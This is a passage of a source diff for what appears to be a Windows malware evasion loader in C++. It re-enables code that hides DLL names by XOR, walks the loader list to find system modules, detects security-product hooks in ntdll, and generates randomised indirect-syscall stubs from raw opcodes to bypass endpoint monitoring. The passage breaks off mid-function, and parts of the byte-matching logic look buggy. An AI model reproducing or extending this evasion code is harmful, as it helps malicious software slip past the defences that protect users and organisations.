@@ -22,14 +22,14 @@
 #define MAX_SYSCALLS 30
 #define SIZE_OF_SYSCALL_CODE 64
 
+//#include <Windows.h>
+//h#include <winternl.h>
 #include "ntghost.h"
+#include "DbgMacros.h"
+#include <ctime>
 #if DEBUG | DEBUG_FILE
     #include <iomanip>
 #endif
-//#include <Windows.h>
-//h#include <winternl.h>
-#include <ctime>
-#include "DbgMacros.h"
 
 #define HEX_K 0xFF
 #define X_C(c) static_cast<wchar_t>((c) ^ HEX_K)
@@ -39,7 +39,17 @@ wchar_t obf_Usr_32[] = { X_C(L'u'), X_C(L's'), X_C(L'e'), X_C(L'r'), X_C(L'3'), 
 wchar_t obf_Ker_32[] = { X_C(L'k'), X_C(L'e'), X_C(L'r'), X_C(L'n'), X_C(L'e'), X_C(L'l'), X_C(L'3'), X_C(L'2'), X_C(L'.'), X_C(L'd'), X_C(L'l'), X_C(L'l'), L'\0'};
 wchar_t obf_Ntd_32[] = { X_C(L'n'), X_C(L't'), X_C(L'd'), X_C(L'l'), X_C(L'l'), X_C(L'.'), X_C(L'd'), X_C(L'l'), X_C(L'l'), L'\0'};
 
-HMODULE hNtdll = nullptr;
+////////////////////////////////////////////////////////////////////////////////
+
+typedef void* (__stdcall *GenericSyscallType)(...);
+void* FindExportAddress(HMODULE, const char*);
+
+//===============================================================================
+
+typedef BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
+// typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+// typedef DWORD (WINAPI *pGetCurrentDirectoryW)(DWORD, LPWSTR);
+// typedef DWORD (WINAPI *pGetLastError)(VOID);
 
 ////////////////////////////////////////////////////////////////////////////////
 
@@ -50,7 +60,7 @@ struct Sys_stb
     size_t stubsize;
     void* pStubAddress;
     BYTE* pCleanSyscall;
-};
+}syscallEntries[MAX_SYSCALLS];
 
 struct _LIBS
 {
@@ -61,36 +71,17 @@ struct _LIBS
 
 typedef struct _MY_FUNCTIONS
 {
-    LPVOID pGetProcAddress;
-    LPVOID pLoadLibraryA;
-    LPVOID pVirtualAlloc;
-    LPVOID pVirtualProtect;
-    LPVOID pGetLastError;
-    LPVOID pCreateFileW;
-} MY_FUNCTIONS;
-MY_FUNCTIONS sGhostFn;
+    pVirtualProtect MyVirtualProtect;
+}_MY_FUNCTIONS;
+_MY_FUNCTIONS fn;
 
 BYTE* pSyscallPool = nullptr;
-Sys_stb syscallEntries[MAX_SYSCALLS];
 size_t stubCount = 0, stubOffset = 0;
+HMODULE hNtdll = nullptr;
 
 ////////////////////////////////////////////////////////////////////////////////
 
-typedef void* (__stdcall *GenericSyscallType)(...);
-void* FindExportAddress(HMODULE, const char*);
-
-//===============================================================================
-
-typedef HANDLE (WINAPI *pGetCurrentProcess)(VOID);
-typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
-typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
-typedef DWORD (WINAPI *pGetCurrentDirectoryW)(DWORD, LPWSTR);
-typedef BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
-typedef DWORD (WINAPI *pGetLastError)(VOID);
-
-////////////////////////////////////////////////////////////////////////////////
-
-void GetFunctions()
+int GetFunctions()
 {
     HMODULE kernel32Base = NULL;
     HMODULE ntdllBase = NULL;
@@ -116,7 +107,7 @@ void GetFunctions()
     LIST_ENTRY* current = head->Flink;
     while (current != head)
     {
-        LDR_DATA_TABLE_ENTRY* entry = ((LDR_DATA_TABLE_ENTRY*)((PCHAR)(current) - (ULONG_PTR)(&((LDR_DATA_TABLE_ENTRY*)0)->InLoadOrderLinks)));
+        LDR_DATA_TABLE_ENTRY* entry = ((LDR_DATA_TABLE_ENTRY*)((PCHAR)(current) - (ULONG_PTR)(&((LDR_DATA_TABLE_ENTRY*)0)->InMemoryOrderLinks)));
         
         if (entry->BaseDllName.Buffer != nullptr)
         {
@@ -131,451 +122,463 @@ void GetFunctions()
     for (size_t i = 0; i < wcslen(obf_Ker_32); i++) obf_Ker_32[i] = 0;
     for (size_t i = 0; i < wcslen(obf_Ntd_32); i++) obf_Ntd_32[i] = 0;
 
+    if(sLibs.hKERNEL32 == 0 || sLibs.hNtdll == 0 || sLibs.hUsr32 == 0)
+    {
+        norm("\n");fuk("Problems with Dlls");
+        return 0;
+    }
+
     //=======================================================================
     norm(YELLOW"\n======================================================");
     norm("\nKernel32 Base: ", CYAN"0x", std::hex, sLibs.hKERNEL32);
     norm("\nNTDLL Base: ", CYAN"0x", std::hex, sLibs.hNtdll);
     norm("\nUsr32 Base: ", CYAN"0x", std::hex, sLibs.hUsr32);
+
+    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+norm("!!!!!!!!!!!!!!!!");
+    fn.MyVirtualProtect = (pVirtualProtect)FindExportAddress(sLibs.hKERNEL32, "VirtualProtect");
+norm("@@@@@@@@@@@@@@@@");
+    if(!fn.MyVirtualProtect) fuk("No Virtual protek");
+    ok("Got Virtual Protek");
+
+    return 1;
 }
 
-
-
-// BYTE* GenerateSyscallStub(Sys_stb* sEntry)
-// {
-//     BYTE* syscall_code = new BYTE[64]();
-//     BYTE nop[] = {0x90}, pushf[] = {0x9c}, popf[] = {0x9d};
-//     size_t Generate_Syscall_Offset = 0;
+BYTE* GenerateSyscallStub(Sys_stb* sEntry)
+{
+    BYTE* syscall_code = new BYTE[64]();
+    BYTE nop[] = {0x90}, pushf[] = {0x9c}, popf[] = {0x9d};
+    size_t Generate_Syscall_Offset = 0;
     
-//     // memcpy(syscall_code + Generate_Syscall_Offset, pushf, sizeof(pushf));
-//     // ++Generate_Syscall_Offset;
-//     //===============================================================================================
+    // memcpy(syscall_code + Generate_Syscall_Offset, pushf, sizeof(pushf));
+    // ++Generate_Syscall_Offset;
+    //===============================================================================================
 
-//     //Add random Nops
-//     for(int i = 0; i < rand() % 3; ++i)                // Add random NOPs
-//     {
-//         memcpy(syscall_code + Generate_Syscall_Offset, nop, sizeof(nop));                      
-//         ++Generate_Syscall_Offset;
-//     }
+    //Add random Nops
+    for(int i = 0; i < rand() % 3; ++i)                // Add random NOPs
+    {
+        memcpy(syscall_code + Generate_Syscall_Offset, nop, sizeof(nop));                      
+        ++Generate_Syscall_Offset;
+    }
 
-//     ///////////////////////////////////////////////SSN///////////////////////////////////////////////
+    ///////////////////////////////////////////////SSN///////////////////////////////////////////////
 
-//     // switch(9)
-//     switch(rand() % 3)
-//     {  
-//         case 0:                                                     // HIGH_LOW
-//         {   
-//             norm(YELLOW"in 0 [SSN] "); 
+    // switch(9)
+    switch(rand() % 3)
+    {  
+        case 0:                                                     // HIGH_LOW
+        {   
+            norm(YELLOW"in 0 [SSN] "); 
 
-//             DWORD ssn = sEntry->SSN;
-//             BYTE lowByte = (BYTE)(ssn & 0xFF);
-//             DWORD highBytes = (ssn & 0xFFFFFF00);
+            DWORD ssn = sEntry->SSN;
+            BYTE lowByte = (BYTE)(ssn & 0xFF);
+            DWORD highBytes = (ssn & 0xFFFFFF00);
 
-//             BYTE temp_code[] = 
-//             {
-//                 0x31, 0xC0,                                         // xor eax, eax
-//                 0xB0, 0x00,                                         // mov al, SSN_LOW
-//                 0x81, 0xC0, 0x00, 0x00, 0x00, 0x00                  // add eax, SSN_HIGH_SHIFTED
-//             };
-//             *(BYTE*)(temp_code + 3) = lowByte;
-//             *(DWORD*)(temp_code + 6) = highBytes;
+            BYTE temp_code[] = 
+            {
+                0x31, 0xC0,                                         // xor eax, eax
+                0xB0, 0x00,                                         // mov al, SSN_LOW
+                0x81, 0xC0, 0x00, 0x00, 0x00, 0x00                  // add eax, SSN_HIGH_SHIFTED
+            };
+            *(BYTE*)(temp_code + 3) = lowByte;
+            *(DWORD*)(temp_code + 6) = highBytes;
 
-//             memcpy(syscall_code + Generate_Syscall_Offset, temp_code, sizeof(temp_code));           
-//             Generate_Syscall_Offset += sizeof(temp_code);
+            memcpy(syscall_code + Generate_Syscall_Offset, temp_code, sizeof(temp_code));           
+            Generate_Syscall_Offset += sizeof(temp_code);
 
-//             break;
-//         }
+            break;
+        }
 
-//         case 1:                                                     // ADD_RANDOM
-//         {
-//             norm(YELLOW"IN 1 [SSN] ");
-//             BYTE randNum = (BYTE)(rand() % 0x50);
+        case 1:                                                     // ADD_RANDOM
+        {
+            norm(YELLOW"IN 1 [SSN] ");
+            BYTE randNum = (BYTE)(rand() % 0x50);
 
-//             BYTE temp_code[] =
-//             {
-//                 0xB8, 0x00, 0x00, 0x00, 0x00,                    // mov eax, X
-//                 0x05, 0x00, 0x00, 0x00, 0x00                     // add eax, Y
-//             };
-//             *(DWORD*)(temp_code + 1) = randNum;
-//             *(DWORD*)(temp_code + 6) = sEntry->SSN - randNum;
+            BYTE temp_code[] =
+            {
+                0xB8, 0x00, 0x00, 0x00, 0x00,                    // mov eax, X
+                0x05, 0x00, 0x00, 0x00, 0x00                     // add eax, Y
+            };
+            *(DWORD*)(temp_code + 1) = randNum;
+            *(DWORD*)(temp_code + 6) = sEntry->SSN - randNum;
 
-//             memcpy(syscall_code + Generate_Syscall_Offset, temp_code, sizeof(temp_code));           
-//             Generate_Syscall_Offset += sizeof(temp_code);
+            memcpy(syscall_code + Generate_Syscall_Offset, temp_code, sizeof(temp_code));           
+            Generate_Syscall_Offset += sizeof(temp_code);
             
-//             break;
-//         }
+            break;
+        }
 
-//         case 2:                                                     // PUSH_POP
-//         {   
-//             norm(YELLOW"IN 2 [SSN] ");
-//             BYTE temp_code[] =
-//             {
-//                 0x9C,                                        // pushfq (save flags)
+        case 2:                                                     // PUSH_POP
+        {   
+            norm(YELLOW"IN 2 [SSN] ");
+            BYTE temp_code[] =
+            {
+                0x9C,                                        // pushfq (save flags)
                 
-//                 0x31, 0xC0,                                   // xor eax, eax
-//                 0x68, 0x00, 0x00, 0x00, 0x00,                   // push SSN
-//                 0x58,                                           // pop rax (SSN -> rax)
+                0x31, 0xC0,                                   // xor eax, eax
+                0x68, 0x00, 0x00, 0x00, 0x00,                   // push SSN
+                0x58,                                           // pop rax (SSN -> rax)
 
-//                 0x9D,                                        // popfq (restore flags)
-//             };
-//             *(DWORD*)(temp_code + 4) = sEntry->SSN;
+                0x9D,                                        // popfq (restore flags)
+            };
+            *(DWORD*)(temp_code + 4) = sEntry->SSN;
             
-//             memcpy(syscall_code + Generate_Syscall_Offset, temp_code, sizeof(temp_code));           
-//             Generate_Syscall_Offset += sizeof(temp_code);
+            memcpy(syscall_code + Generate_Syscall_Offset, temp_code, sizeof(temp_code));           
+            Generate_Syscall_Offset += sizeof(temp_code);
 
-//             break;
-//         }
+            break;
+        }
 
-//         default:
-//         {   norm(YELLOW"DEFAULT [SSN] ");
-//             BYTE temp_code[] =
-//             {
-//                 0xB8, 0x00, 0x00, 0x00, 0x00                 // mov eax, SSN
-//             };
-//             *(DWORD*)(temp_code + 1) = sEntry->SSN;
+        default:
+        {   norm(YELLOW"DEFAULT [SSN] ");
+            BYTE temp_code[] =
+            {
+                0xB8, 0x00, 0x00, 0x00, 0x00                 // mov eax, SSN
+            };
+            *(DWORD*)(temp_code + 1) = sEntry->SSN;
 
-//             memcpy(syscall_code + Generate_Syscall_Offset, temp_code, sizeof(temp_code));
-//             Generate_Syscall_Offset += sizeof(temp_code);
+            memcpy(syscall_code + Generate_Syscall_Offset, temp_code, sizeof(temp_code));
+            Generate_Syscall_Offset += sizeof(temp_code);
         
-//             break;
-//         }
-//     }
+            break;
+        }
+    }
 
-//     //===============================================================================================
-//     //Add random Nops
-//     for(int i = 0; i < rand() % 3; ++i)                // Add random NOPs
-//     {
-//         memcpy(syscall_code + Generate_Syscall_Offset, nop, sizeof(nop));                      
-//         ++Generate_Syscall_Offset;
-//     }
+    //===============================================================================================
+    //Add random Nops
+    for(int i = 0; i < rand() % 3; ++i)                // Add random NOPs
+    {
+        memcpy(syscall_code + Generate_Syscall_Offset, nop, sizeof(nop));                      
+        ++Generate_Syscall_Offset;
+    }
 
-//     ///////////////////////////////////////////////MOV/////////////////////////////////////////////// 
+    ///////////////////////////////////////////////MOV/////////////////////////////////////////////// 
 
-//     //switch(9)
-//     switch(rand() % 4)
-//     {  
-//         case 0:                                                     // xor and mov
-//         {
-//             norm(YELLOW"in 0 [move] ");
-//             BYTE tempcode[] = 
-//             {
-//                 0x4D, 0x31, 0xD2,                   // xor r10, r10
-//                 0x49, 0x89, 0xCA                    // mov r10, rcx 
-//             };
-//             memcpy(syscall_code + Generate_Syscall_Offset, tempcode, sizeof(tempcode));
-//             Generate_Syscall_Offset += sizeof(tempcode);
-//         break;
-//         }
+    //switch(9)
+    switch(rand() % 4)
+    {  
+        case 0:                                                     // xor and mov
+        {
+            norm(YELLOW"in 0 [move] ");
+            BYTE tempcode[] = 
+            {
+                0x4D, 0x31, 0xD2,                   // xor r10, r10
+                0x49, 0x89, 0xCA                    // mov r10, rcx 
+            };
+            memcpy(syscall_code + Generate_Syscall_Offset, tempcode, sizeof(tempcode));
+            Generate_Syscall_Offset += sizeof(tempcode);
+        break;
+        }
 
-//         case 1:                                                     // and then move
-//         {
-//             norm(YELLOW"in 1 [move] ");
+        case 1:                                                     // and then move
+        {
+            norm(YELLOW"in 1 [move] ");
 
-//             BYTE tempcode[] = 
-//             {
-//                 0x9c,                                       // pushf
-//                 0x49, 0x81, 0xE2, 0x00, 0x00, 0x00, 0x00,   // and r10, 0
-//                 0x49, 0x89, 0xCA,                           // mov r10, rcx
-//                 0x9d                                        // popf
-//             };
-//             memcpy(syscall_code + Generate_Syscall_Offset, tempcode, sizeof(tempcode));
-//             Generate_Syscall_Offset += sizeof(tempcode);
+            BYTE tempcode[] = 
+            {
+                0x9c,                                       // pushf
+                0x49, 0x81, 0xE2, 0x00, 0x00, 0x00, 0x00,   // and r10, 0
+                0x49, 0x89, 0xCA,                           // mov r10, rcx
+                0x9d                                        // popf
+            };
+            memcpy(syscall_code + Generate_Syscall_Offset, tempcode, sizeof(tempcode));
+            Generate_Syscall_Offset += sizeof(tempcode);
         
-//             break;
-//         }
+            break;
+        }
 
-//         case 2:                                                     // push move pop
-//         {   
-//             norm(YELLOW"in 2 [move] ");                                                                             
-//             BYTE tempcode[] = 
-//             {
-//                 0x9c,                                       // pushf
-//                 0x51,                                       // push rcx
-//                 0x4C, 0x8B, 0x14, 0x24,                     // mov r10, [rsp]
-//                 0x59,                                       // pop rcx
-//                 0x9d                                        // popf
-//             };
-//             memcpy(syscall_code + Generate_Syscall_Offset, tempcode, sizeof(tempcode));
-//             Generate_Syscall_Offset += sizeof(tempcode);
+        case 2:                                                     // push move pop
+        {   
+            norm(YELLOW"in 2 [move] ");                                                                             
+            BYTE tempcode[] = 
+            {
+                0x9c,                                       // pushf
+                0x51,                                       // push rcx
+                0x4C, 0x8B, 0x14, 0x24,                     // mov r10, [rsp]
+                0x59,                                       // pop rcx
+                0x9d                                        // popf
+            };
+            memcpy(syscall_code + Generate_Syscall_Offset, tempcode, sizeof(tempcode));
+            Generate_Syscall_Offset += sizeof(tempcode);
         
-//             break;
-//         }
+            break;
+        }
 
-//         case 3:                                                     // push xor xchg pop
-//         {
-//             norm(YELLOW"in 3 [move] ");
-//             BYTE tempcode[] = 
-//             {
-//                 0x9c,                           // pushf
-//                 0x51,                           // push rcx
-//                 0x49, 0x31, 0xD2,               // xor r10, r10
-//                 0x4C, 0x87, 0x14, 0x24,         // xchg r10, [rsp]
-//                 0x59,                           // pop rcx
-//                 0x9d                            // popf
-//             };
-//             memcpy(syscall_code + Generate_Syscall_Offset, tempcode, sizeof(tempcode));
-//             Generate_Syscall_Offset += sizeof(tempcode);
-//         break;
-//         }
+        case 3:                                                     // push xor xchg pop
+        {
+            norm(YELLOW"in 3 [move] ");
+            BYTE tempcode[] = 
+            {
+                0x9c,                           // pushf
+                0x51,                           // push rcx
+                0x49, 0x31, 0xD2,               // xor r10, r10
+                0x4C, 0x87, 0x14, 0x24,         // xchg r10, [rsp]
+                0x59,                           // pop rcx
+                0x9d                            // popf
+            };
+            memcpy(syscall_code + Generate_Syscall_Offset, tempcode, sizeof(tempcode));
+            Generate_Syscall_Offset += sizeof(tempcode);
+        break;
+        }
 
-//         default:                                                                             
-//         {   norm(YELLOW"in DEFAULT [MOV] ");                                                                             
+        default:                                                                             
+        {   norm(YELLOW"in DEFAULT [MOV] ");                                                                             
 
-//             BYTE mov_r10_rcx[] =
-//             {
-//                 0x4C, 0x8B, 0xD1                                    // mov r10, rcx
-//             };
+            BYTE mov_r10_rcx[] =
+            {
+                0x4C, 0x8B, 0xD1                                    // mov r10, rcx
+            };
             
-//             memcpy(syscall_code + Generate_Syscall_Offset, mov_r10_rcx, sizeof(mov_r10_rcx));
-//             Generate_Syscall_Offset += sizeof(mov_r10_rcx);
+            memcpy(syscall_code + Generate_Syscall_Offset, mov_r10_rcx, sizeof(mov_r10_rcx));
+            Generate_Syscall_Offset += sizeof(mov_r10_rcx);
         
-//             break;
-//         }
-//     }
+            break;
+        }
+    }
 
-//     //===============================================================================================
-//     //Add random Nops
-//     for(int i = 0; i < rand() % 3; ++i)                // Add random NOPs
-//     {
-//         memcpy(syscall_code + Generate_Syscall_Offset, nop, sizeof(nop));                      
-//         ++Generate_Syscall_Offset;
-//     }
+    //===============================================================================================
+    //Add random Nops
+    for(int i = 0; i < rand() % 3; ++i)                // Add random NOPs
+    {
+        memcpy(syscall_code + Generate_Syscall_Offset, nop, sizeof(nop));                      
+        ++Generate_Syscall_Offset;
+    }
 
-//     ///////////////////////////////////////////////JMP/////////////////////////////////////////////// 
+    ///////////////////////////////////////////////JMP/////////////////////////////////////////////// 
 
-//     //switch(9)
-//     switch(rand() % 3)
-//     {
-//         case 0:                                                     // push and xchg
-//         {   
-//             norm(YELLOW"in 0 [jmp] \n");
-//             BYTE jmp_code[] =
-//             {
-//                 0x50,                                                           // push rax
-//                 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov rax, syscall_addr
-//                 0x48, 0x87, 0x04, 0x24,                                         // xchg rax, [rsp]
-//                 0xC3                                                            // ret
-//             };
-//             *(UINT64*)(jmp_code + 3) = (UINT64)sEntry->pCleanSyscall;
+    //switch(9)
+    switch(rand() % 3)
+    {
+        case 0:                                                     // push and xchg
+        {   
+            norm(YELLOW"in 0 [jmp] \n");
+            BYTE jmp_code[] =
+            {
+                0x50,                                                           // push rax
+                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov rax, syscall_addr
+                0x48, 0x87, 0x04, 0x24,                                         // xchg rax, [rsp]
+                0xC3                                                            // ret
+            };
+            *(UINT64*)(jmp_code + 3) = (UINT64)sEntry->pCleanSyscall;
             
-//             memcpy(syscall_code + Generate_Syscall_Offset, jmp_code, sizeof(jmp_code));
-//             Generate_Syscall_Offset += sizeof(jmp_code);
+            memcpy(syscall_code + Generate_Syscall_Offset, jmp_code, sizeof(jmp_code));
+            Generate_Syscall_Offset += sizeof(jmp_code);
 
-//             break;
-//         }
+            break;
+        }
 
-//         case 1:                                                     // Push + ret technique
-//         {
-//             norm(YELLOW"in 1 [jmp] \n");
-//             BYTE jmp_code[] =
-//             {
-//                 0x50,                                                           // push rax
-//                 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov rax, syscall_addr
-//                 0x48, 0x87, 0x04, 0x24,                                         // xchg rax, [rsp]
-//                 0xC3                                                            // ret
-//             };
-//             *(UINT64*)(jmp_code + 3) = (UINT64)sEntry->pCleanSyscall;
+        case 1:                                                     // Push + ret technique
+        {
+            norm(YELLOW"in 1 [jmp] \n");
+            BYTE jmp_code[] =
+            {
+                0x50,                                                           // push rax
+                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov rax, syscall_addr
+                0x48, 0x87, 0x04, 0x24,                                         // xchg rax, [rsp]
+                0xC3                                                            // ret
+            };
+            *(UINT64*)(jmp_code + 3) = (UINT64)sEntry->pCleanSyscall;
             
-//             memcpy(syscall_code + Generate_Syscall_Offset, jmp_code, sizeof(jmp_code));
-//             Generate_Syscall_Offset += sizeof(jmp_code);
+            memcpy(syscall_code + Generate_Syscall_Offset, jmp_code, sizeof(jmp_code));
+            Generate_Syscall_Offset += sizeof(jmp_code);
 
-//             break;
-//         }
+            break;
+        }
         
-//         case 2:                                                     // Using Upper and Lower bits
-//         {
-//             norm(YELLOW"in 2 [jmp] \n");
-//             BYTE jmp_code[] =
-//             {
-//                 0x9C,                               // pushf
-//                 0x48, 0xC7, 0x04, 0x24,             // mov dword [rsp], imm32 (lower half)
-//                 0x00, 0x00, 0x00, 0x00,
-//                 0xC7, 0x44, 0x24, 0x04,             // mov dword [rsp+4], imm32 (upper half)
-//                 0x00, 0x00, 0x00, 0x00,
-//                 //0x9D,                               // popf
-//                 0xC3,                               // ret
-//             };
+        case 2:                                                     // Using Upper and Lower bits
+        {
+            norm(YELLOW"in 2 [jmp] \n");
+            BYTE jmp_code[] =
+            {
+                0x9C,                               // pushf
+                0x48, 0xC7, 0x04, 0x24,             // mov dword [rsp], imm32 (lower half)
+                0x00, 0x00, 0x00, 0x00,
+                0xC7, 0x44, 0x24, 0x04,             // mov dword [rsp+4], imm32 (upper half)
+                0x00, 0x00, 0x00, 0x00,
+                //0x9D,                               // popf
+                0xC3,                               // ret
+            };
             
-//             *(DWORD*)(jmp_code + 5) = (DWORD)((UINT64)sEntry->pCleanSyscall & 0xFFFFFFFF);
-//             *(DWORD*)(jmp_code + 13) = (DWORD)((UINT64)sEntry->pCleanSyscall >> 32);
+            *(DWORD*)(jmp_code + 5) = (DWORD)((UINT64)sEntry->pCleanSyscall & 0xFFFFFFFF);
+            *(DWORD*)(jmp_code + 13) = (DWORD)((UINT64)sEntry->pCleanSyscall >> 32);
 
-//             memcpy(syscall_code + Generate_Syscall_Offset, jmp_code, sizeof(jmp_code));
-//             Generate_Syscall_Offset += sizeof(jmp_code);
+            memcpy(syscall_code + Generate_Syscall_Offset, jmp_code, sizeof(jmp_code));
+            Generate_Syscall_Offset += sizeof(jmp_code);
 
-//             break;
-//         }
+            break;
+        }
 
-//         default:                                                                             
-//         {   norm(YELLOW"in DEFAULT [JMP] ");                                                                             
+        default:                                                                             
+        {   norm(YELLOW"in DEFAULT [JMP] ");                                                                             
 
-//             BYTE jmp_code[] =
-//             {
-//                 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,                // jmp [rip+0]
-//                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00     // syscall address
-//             };
-//             *(UINT64*)(jmp_code + 6) = (UINT64)sEntry->pCleanSyscall;
+            BYTE jmp_code[] =
+            {
+                0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,                // jmp [rip+0]
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00     // syscall address
+            };
+            *(UINT64*)(jmp_code + 6) = (UINT64)sEntry->pCleanSyscall;
             
-//             memcpy(syscall_code + Generate_Syscall_Offset, jmp_code, sizeof(jmp_code));
-//             Generate_Syscall_Offset += sizeof(jmp_code);
+            memcpy(syscall_code + Generate_Syscall_Offset, jmp_code, sizeof(jmp_code));
+            Generate_Syscall_Offset += sizeof(jmp_code);
 
-//             break;
-//         }
-//     }
+            break;
+        }
+    }
 
-//     //===============================================================================================
+    //===============================================================================================
 
-//     //Add random Nops
-//     for(int i = 0; i < rand() % 3; ++i)                // Add random NOPs
-//     {
-//         memcpy(syscall_code + Generate_Syscall_Offset, nop, sizeof(nop));                      
-//         ++Generate_Syscall_Offset;
-//     }
+    //Add random Nops
+    for(int i = 0; i < rand() % 3; ++i)                // Add random NOPs
+    {
+        memcpy(syscall_code + Generate_Syscall_Offset, nop, sizeof(nop));                      
+        ++Generate_Syscall_Offset;
+    }
 
-//     //////////////////////////////////////////////////////////////////////////////////////////////////
+    //////////////////////////////////////////////////////////////////////////////////////////////////
 
-//     // memcpy(syscall_code + Generate_Syscall_Offset, popf, sizeof(popf));
-//     // ++Generate_Syscall_Offset;
+    // memcpy(syscall_code + Generate_Syscall_Offset, popf, sizeof(popf));
+    // ++Generate_Syscall_Offset;
 
-//     sEntry->stubsize = Generate_Syscall_Offset;
+    sEntry->stubsize = Generate_Syscall_Offset;
 
-//     #if DEBUG
-//         norm("Syscall Code Contents:");
-//         for(int i = 0; i < SIZE_OF_SYSCALL_CODE; ++i)
-//         {
-//             if(i % 16 == 0) std::cout << YELLOW"\n" << std::hex << std::setw(4) << std::setfill('0') << i << CYAN": ";
-//             std::cout << std::hex << std::setw(2) << std::setfill('0') << CYAN"" << std::setw(2) << std::setfill('0') << (int)syscall_code[i] << " ";
-//         }
-//         std::cout << RESET"\n";
-//     #endif
+    #if DEBUG
+        norm("Syscall Code Contents:");
+        for(int i = 0; i < SIZE_OF_SYSCALL_CODE; ++i)
+        {
+            if(i % 16 == 0) std::cout << YELLOW"\n" << std::hex << std::setw(4) << std::setfill('0') << i << CYAN": ";
+            std::cout << std::hex << std::setw(2) << std::setfill('0') << CYAN"" << std::setw(2) << std::setfill('0') << (int)syscall_code[i] << " ";
+        }
+        std::cout << RESET"\n";
+    #endif
 
-//     return syscall_code;
-// }
+    return syscall_code;
+}
 
-// void* AddStubToPool(Sys_stb* sEntry, size_t NumberOfElements)
-// {
-//     BYTE* stubAddress = nullptr;
+void* AddStubToPool(Sys_stb* sEntry, size_t NumberOfElements)
+{
+    BYTE* stubAddress = nullptr;
 
-//     if(stubCount >= MAX_SYSCALLS)
-//     {
-//         fuk("Max number of syscalls reached in pool");
-//         return (void*)(~0ull);
-//     }
+    if(stubCount >= MAX_SYSCALLS)
+    {
+        fuk("Max number of syscalls reached in pool");
+        return (void*)(~0ull);
+    }
 
-//     for(size_t j = 0; j < NumberOfElements; ++j)
-//     {
-//         void* vpfunction = FindExportAddress(hNtdll, sEntry[j].function_name);
-//         if(!vpfunction)
-//         {
-//             fuk("Couldn't find the function\n");
-//             return (void*)(~0ull);
-//         }
+    for(size_t j = 0; j < NumberOfElements; ++j)
+    {
+        void* vpfunction = FindExportAddress(hNtdll, sEntry[j].function_name);
+        if(!vpfunction)
+        {
+            fuk("Couldn't find the function\n");
+            return (void*)(~0ull);
+        }
 
-//         ////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        ////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-//         BYTE* pBytes = reinterpret_cast<BYTE*>(vpfunction);
-//         if(pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1)
-//         {
-//             norm("\n");ok("Function ", sEntry[j].function_name," is Unhooked\n");
-//             for(int i = 0; i < 32; ++i)
-//             {
-//                 if(sEntry[j].SSN != 0 && sEntry[j].pCleanSyscall != nullptr) break;
-//                 if(!sEntry[j].SSN && i + 4 < 32 && pBytes[i] == 0xB8)
-//                 {
-//                     sEntry[j].SSN = *(DWORD*)(pBytes + i + 1);
-//                     //norm("SSN:",CYAN" 0x", std::hex, sEntry[j].SSN, "\n"); 
-//                 }
+        BYTE* pBytes = reinterpret_cast<BYTE*>(vpfunction);
+        if(pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1)
+        {
+            norm("\n");ok("Function ", sEntry[j].function_name," is Unhooked\n");
+            for(int i = 0; i < 32; ++i)
+            {
+                if(sEntry[j].SSN != 0 && sEntry[j].pCleanSyscall != nullptr) break;
+                if(!sEntry[j].SSN && i + 4 < 32 && pBytes[i] == 0xB8)
+                {
+                    sEntry[j].SSN = *(DWORD*)(pBytes + i + 1);
+                    //norm("SSN:",CYAN" 0x", std::hex, sEntry[j].SSN, "\n"); 
+                }
 
-//                 if(!sEntry[j].pCleanSyscall && i + 1 < 32 && (pBytes[i] == 0x0F || pBytes[i+1] == 0x05))
-//                 {
-//                     sEntry[j].pCleanSyscall = pBytes + i;
-//                     //norm("Address of the Syscall: ", CYAN"0x", std::hex, reinterpret_cast<void*>(sEntry[j].pCleanSyscall), "\n");
-//                 }
-//             }
+                if(!sEntry[j].pCleanSyscall && i + 1 < 32 && (pBytes[i] == 0x0F || pBytes[i+1] == 0x05))
+                {
+                    sEntry[j].pCleanSyscall = pBytes + i;
+                    //norm("Address of the Syscall: ", CYAN"0x", std::hex, reinterpret_cast<void*>(sEntry[j].pCleanSyscall), "\n");
+                }
+            }
 
-//             if(sEntry[j].SSN == 0 || sEntry[j].pCleanSyscall == nullptr)
-//             {
-//                 fuk("Couldn't find either the SSN or SYSCALL\n");
-//                 return (void*)(~0ull);
-//             }
-//         }
-//         else
-//         {
-//             fuk("Function ", sEntry[j].function_name, " might be hooked\n");
-//             return (void*)(~0ull);
-//         }
+            if(sEntry[j].SSN == 0 || sEntry[j].pCleanSyscall == nullptr)
+            {
+                fuk("Couldn't find either the SSN or SYSCALL\n");
+                return (void*)(~0ull);
+            }
+        }
+        else
+        {
+            fuk("Function ", sEntry[j].function_name, " might be hooked\n");
+            return (void*)(~0ull);
+        }
 
-//         ok("Done ", sEntry[j].function_name, "\n");
-//         ////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        ok("Done ", sEntry[j].function_name, "\n");
+        ////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-//         BYTE* syscall_code = GenerateSyscallStub(&sEntry[j]);
+        BYTE* syscall_code = GenerateSyscallStub(&sEntry[j]);
 
-//         if(stubOffset + SIZE_OF_SYSCALL_CODE > MAX_SYSCALLS * SIZE_OF_SYSCALL_CODE)
-//         {
-//             fuk("The Syscall Pool is full");
-//             return (void*)(~0ull);
-//         }
